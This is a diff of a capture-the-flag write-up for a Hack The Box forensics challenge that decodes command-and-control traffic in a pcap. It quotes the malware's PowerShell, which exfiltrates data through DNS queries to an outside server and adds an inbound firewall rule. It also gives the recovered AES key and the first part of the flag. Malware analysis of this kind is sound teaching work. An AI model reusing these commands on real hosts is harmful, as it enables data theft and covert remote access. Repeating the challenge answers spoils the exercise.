@@ -1,3 +1,5 @@
+# HTB Forensics Automation
+
 This challenge is about extracting encoded information in a Wireshark pcap network dump file,
 where the scenario is that a host on the network has been infected with a command/control malware and has been sending suspicious network traffic.
 We have been given a pcap which contains some of this type of malicious traffic.
@@ -119,6 +121,9 @@ Resolve-DnsName -type A -DnsOnly $domain -Server 147.182.172.189
 Resolve-DnsName -type A -DnsOnly end.windowsliveupdater.com -Server 147.182.172.189
 }
 ```
+
+## Obtaining the first half of the flag
+
 It appears the AES key used is a1E4MUtycWswTmtrMHdqdg== (kQ81Krqk0Nkk0wjv), which is exactly 16 characters - we're working with a 128 bit AES key, but the script itself seems to ask for a 256 bit key... Also, it appears that the first 16 bytes of each message is likely to be an AES initialization vector, as this can be gathered from the 'Decrypt-String' function which contains the following statement:
 
 ```powershell
@@ -164,6 +169,8 @@ netsh advfirewall firewall add rule name="Terminal Server" dir=in action=allow p
 ```
 
 Since we're just hunting Base64 at this point... the created DefaultUsr string decodes from base64 into "$part1='HTB{y0u_c4n_'", which is the first part of the flag. The remainder can likely be found in the additional DNS queries where data exfiltration appear to be taking place in the hostnames.
+
+## Obtaining the second part of the flag
 
 Reading the Encrypt-String function, it also appears that the output of it is converting from what is likely to be Base64 into hex, so let's convert this back and put the newly gathered base64 strings into the decryptor function. From there, it is just a matter of putting all the hexes into powershell (manually, eugh) and then converting, then decrypting.
 
